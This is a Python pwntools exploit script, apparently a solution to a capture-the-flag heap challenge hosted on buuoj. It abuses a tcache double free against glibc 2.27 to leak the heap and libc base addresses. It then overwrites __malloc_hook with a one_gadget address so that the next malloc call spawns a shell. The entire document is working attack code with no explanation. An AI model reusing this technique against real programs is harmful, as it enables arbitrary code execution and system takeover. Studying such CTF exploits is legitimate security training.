from pwn import*
def new(title,content):
	p.sendlineafter('>>','1')
	p.sendafter('title:\n',title)
	p.sendafter('content:\n',content)
def free(index):
	p.sendlineafter('>>','2')
	p.sendlineafter('index:',str(index))
p = process('./main')
p = remote('node3.buuoj.cn',28254)
libc =ELF('./libc-2.27.so',checksec=False)
context.log_level ='DEBUG'
new('FMYY','\n')
new('FMYY','\n')
new('FMYY','\x00'*0x10 + p64(0x61))
free(0)
free(0)
new('\x18\x70','FMYY')
heap_base = u64(p.recv(6).ljust(8,'\x00'))- 0x18
log.info('HEAP:\t' + hex(heap_base))

new('FMYY',p64(0) + p64(heap_base + 0x80) + p64(0x101) + p64(heap_base + 0x18)*2)

new(p64(0x7000000000000),'\x00'*0x60 + p64(heap_base + 0x250 + 0x30))
new('FMYY','FMYY')
free(6)
new(p64(0x7000000000000),'\x00'*0x60 + p64(heap_base + 0x250 + 0x20))
new('FMYY','SSSSFMYY')
p.recvuntil('SSSSFMYY')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 0x60
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
rce = libc_base + 0x10A38C
new(p64(malloc_hook),'FAKE')
new(p64(rce),'GETSHELL')
p.sendlineafter('>>','1')
p.interactive()
